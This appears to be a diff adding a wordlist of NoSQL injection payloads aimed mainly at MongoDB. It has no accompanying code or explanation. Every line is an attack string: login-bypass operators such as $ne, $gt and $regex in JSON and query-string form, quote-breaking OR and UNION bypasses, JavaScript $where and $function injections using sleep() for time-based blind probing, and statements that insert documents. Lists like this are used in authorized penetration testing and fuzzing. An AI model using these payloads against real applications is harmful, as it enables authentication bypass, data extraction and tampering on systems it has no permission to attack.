@@ -1,0 +1,101 @@
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+', $or: [ {}, { 'a':'a' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1) } })
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$nin": []}, "password": {"$nin": []}}
+{"username": {"$in": null}, "password": {"$in": null}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": {"$exists": true}, "password": {"$exists": true}}
+{"username":{"$eq":"admin"}, "password":{"$regex":"^.*"}}
+admin' || '1'=='1
+admin' || '1'=='1'--
+admin' || '1'=='1'#
+admin' || '1'=="1
+admin' || '1'=="1"--
+admin' || '1'=="1"#
+admin" || "1"="1
+admin" || "1"="1"--
+admin" || "1"="1"#
+admin") || ("1"="1
+admin") || ("1"="1"--
+admin") || ("1"="1"#
+admin')) || (('1'='1
+admin')) || (('1'='1'--
+admin')) || (('1'='1'#
+admin' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
+admin" UNION SELECT 1, "anotheruser", "doesnt matter", 1--
+{"$gt":""}
+{"$gt": null}
+{"$ne":"password"}
+{"$ne":null}
+{"$lt":""}
+{"$lt": null}
+{"$gte":""}
+{"$gte": null}
+{"$lte":""}
+{"$lte": null}
+{"$nin":["badvalue1"]}
+{"$nin":["password"]}
+{"$nin":[null]}
+{"$in":["validvalue1"]}
+{"$in":["validvalue1","validvalue2"]}
+{"$in":["password"]}
+{"$in":[null]}
+{"$exists":true}
+{"$exists":false}
+{"$regex":"^valid"}
+{"$regex":"^valid.*"}
+{"$regex":"^.*"}
+{"$regex":".*"}
+{"$elemMatch":{"field1":"value1"}}
+{"$all":["valid1","valid2"]}
+{"$size":1}
+{"$mod":[2,0]}
+{"$mod":[2,1]}
+{"$type":1}
+{"$type":2}
+[$ne]=1
+user[$ne]=admin&pass[$ne]=admin
+user[$regex]=^adm.*&pass[$regex]=^.{3,20}$
+user[$exists]=true&pass[$exists]=true
+admin'&&this.password.match(/.*/)//+%00
+admin'&&this.passwordzz.match(/.*/)//+%00
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":{"$gt":""},"password":{"$gt":""},"login":true}
+admin' && this.password.match(/^p.*$/)%00
+admin' && this.password.match(/^p.*$/)%00'
+admin' && this.password.match(/^p.*$/)%00"
+{"$where":"sleep(5000)"}
+{"$where":"this.a==1;sleep(5000)"}
+{"$where":"this.a != this.a;sleep(5000)"}
+{"$where":"this.a != 'bad';sleep(5000)"}
+{"$where":"this.injected"}
+{"$where":"this.injected || sleep(5000)"}
+{"$where":"this.injected || this.a === undefined || sleep(5000)"}
+{"$where":"this.injected || this.a != this.a || sleep(5000)"}
+{"$where":"this.injected === 'value' || sleep(5000)"}
+{"$where":"this.injected === 'value' ? this.a === undefined : sleep(5000)"}
+{"$where":"this.injected && this.a != this.a ? this.injected : sleep(5000)"}
+{"$function":"function() { sleep(5000); return true; }"}
+{"$function":"function() { sleep(5000); return this.username === 'admin'; }"}
+{"$expr":{"$function":{"body":"return sleep(5000)","args":[],"lang":"js"}}}
+{"$expr":{"$function":{"body":"return this.username === 'admin' || sleep(5000)","args":[],"lang":"js"}}}
+{$where: function() { return sleep(5000) || this.amount > 1400; } }
+{$where: function() { return hex_md5('foo') == '37b51d194a7513e45b56f6524f2d51f2'; }}
+username={"$in":["admin"]}
+username[$ne]=baduser&password[$ne]=badpass
+username[$in]=admin,operator,test
+username[$nin]=guest,user1,user2
+username[$exists]=true&password[$exists]=true
+username[$regex]=^admin&password[$regex]=^pass
+username[$options]=i&username[$regex]=AdMiN
